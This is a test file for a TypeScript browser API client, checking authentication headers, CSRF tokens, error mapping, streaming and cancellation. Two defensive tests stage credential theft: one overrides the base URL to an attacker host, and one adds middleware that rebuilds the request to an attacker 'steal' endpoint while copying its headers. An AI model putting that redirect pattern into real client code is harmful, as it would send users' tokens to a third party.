import { describe, expect, test } from 'bun:test';
import {
  LensoApiError,
  LensoTransportError,
  createLensoWebClient,
  browserSupport,
  unwrap,
  unwrapStream,
} from '../src/index.ts';

type Paths = {
  '/notes': {
    get: {
      responses: {
        200: { content: { 'application/json': { notes: string[] } } };
        401: { content: { 'application/problem+json': { type: string; title: string; status: number; code: string } } };
      };
    };
    post: {
      requestBody: { content: { 'application/json': { title: string } } };
      responses: { 201: { content: { 'application/json': { id: string } } } };
    };
  };
  '/events': {
    get: {
      responses: { 200: { content: { 'application/octet-stream': string } } };
    };
  };
};

describe('browser client', () => {
  test('adds bearer evidence and preserves a typed success response', async () => {
    const api = createLensoWebClient<Paths>({
      authentication: { kind: 'bearer', accessToken: async () => 'access-token' },
      baseUrl: 'https://app.example.test',
      fetch: async (request) => {
        expect(request.headers.get('authorization')).toBe('Bearer access-token');
        return Response.json({ notes: ['first'] });
      },
    });

    expect(unwrap(await api.GET('/notes'))).toEqual({ notes: ['first'] });
  });

  test('never sends authentication evidence to an overridden origin', async () => {
    let fetched = false;
    const api = createLensoWebClient<Paths>({
      authentication: { kind: 'bearer', accessToken: () => 'secret' },
      baseUrl: 'https://app.example.test',
      fetch: async () => {
        fetched = true;
        return Response.json({ notes: [] });
      },
    });
    await expect(api.GET('/notes', { baseUrl: 'https://attacker.example' })).rejects.toThrow('cannot override');
    expect(fetched).toBeFalse();
  });

  test('pins authenticated requests after request-level middleware runs', async () => {
    let fetched = false;
    const api = createLensoWebClient<Paths>({
      authentication: { kind: 'bearer', accessToken: () => 'secret' },
      baseUrl: 'https://app.example.test',
      fetch: async () => {
        fetched = true;
        return Response.json({ notes: [] });
      },
    });
    await expect(api.GET('/notes', {
      middleware: [{
        onRequest({ request }) {
          return new Request('https://attacker.example/steal', { headers: request.headers });
        },
      }],
    })).rejects.toThrow('cannot override');
    expect(fetched).toBeFalse();
  });

  test('sends session cookies and CSRF only where needed', async () => {
    const observed: Request[] = [];
    const api = createLensoWebClient<Paths>({
      authentication: { kind: 'session', csrfToken: () => 'csrf-token' },
      baseUrl: 'https://app.example.test',
      fetch: async (request) => {
        observed.push(request);
        return request.method === 'POST'
          ? Response.json({ id: 'note-1' }, { status: 201 })
          : Response.json({ notes: [] });
      },
    });

    unwrap(await api.GET('/notes'));
    unwrap(await api.POST('/notes', { body: { title: 'First' } }));

    expect(observed.map((request) => request.credentials)).toEqual(['include', 'include']);
    expect(observed[0]?.headers.has('x-csrf-token')).toBeFalse();
    expect(observed[1]?.headers.get('x-csrf-token')).toBe('csrf-token');
  });

  test('rejects a session mutation before fetch when CSRF material is unavailable', async () => {
    let fetched = false;
    const api = createLensoWebClient<Paths>({
      authentication: { kind: 'session', csrfToken: () => undefined },
      baseUrl: 'https://app.example.test',
      fetch: async () => {
        fetched = true;
        return Response.json({ id: 'note-1' }, { status: 201 });
      },
    });
    await expect(api.POST('/notes', { body: { title: 'First' } })).rejects.toThrow('requires a CSRF token');
    expect(fetched).toBeFalse();
  });

  test('turns a public problem response into a stable API error', async () => {
    const api = createLensoWebClient<Paths>({
      baseUrl: 'https://app.example.test',
      fetch: async () => Response.json({
        type: 'https://lenso.dev/problems/unauthorized',
        title: 'Unauthorized',
        status: 401,
        code: 'unauthorized',
      }, { status: 401, headers: { 'content-type': 'application/problem+json' } }),
    });

    try {
      unwrap(await api.GET('/notes'));
      throw new Error('expected unwrap to reject the problem response');
    } catch (error) {
      expect(error).toBeInstanceOf(LensoApiError);
      expect((error as LensoApiError).problem.code).toBe('unauthorized');
      expect((error as LensoApiError).response.status).toBe(401);
    }
  });

  test('keeps response streams incremental', async () => {
    const chunks = [new Uint8Array([1]), new Uint8Array([2])];
    let cancelledWith: unknown;
    const api = createLensoWebClient<Paths>({
      baseUrl: 'https://app.example.test',
      fetch: async () => new Response(new ReadableStream({
        pull(controller) {
          const chunk = chunks.shift();
          if (chunk === undefined) controller.close();
          else controller.enqueue(chunk);
        },
        cancel(reason) { cancelledWith = reason; },
      }), { headers: { 'content-type': 'application/octet-stream' } }),
    });

    const stream = unwrapStream(await api.GET('/events', { parseAs: 'stream' }));
    const reader = stream.getReader();
    expect((await reader.read()).value).toEqual(new Uint8Array([1]));
    await reader.cancel('view closed');
    expect(cancelledWith).toBe('view closed');
  });

  test('preserves cancellation as a transport failure', async () => {
    const controller = new AbortController();
    let markStarted: (() => void) | undefined;
    const started = new Promise<void>((resolve) => { markStarted = resolve; });
    const api = createLensoWebClient<Paths>({
      baseUrl: 'https://app.example.test',
      fetch: async (request) => await new Promise<Response>((_resolve, reject) => {
        markStarted?.();
        if (request.signal.aborted) {
          reject(request.signal.reason);
          return;
        }
        request.signal.addEventListener('abort', () => reject(request.signal.reason), { once: true });
      }),
    });
    const pending = api.GET('/notes', { signal: controller.signal });
    await started;
    controller.abort(new DOMException('cancelled', 'AbortError'));
    await expect(pending).rejects.toBeInstanceOf(LensoTransportError);
  });

  test('publishes exact support metadata without a WebSocket or Workers API', () => {
    expect(browserSupport).toEqual({
      requestResponse: true,
      responseStream: true,
      webSocket: false,
      workersHost: false,
    });
  });
});
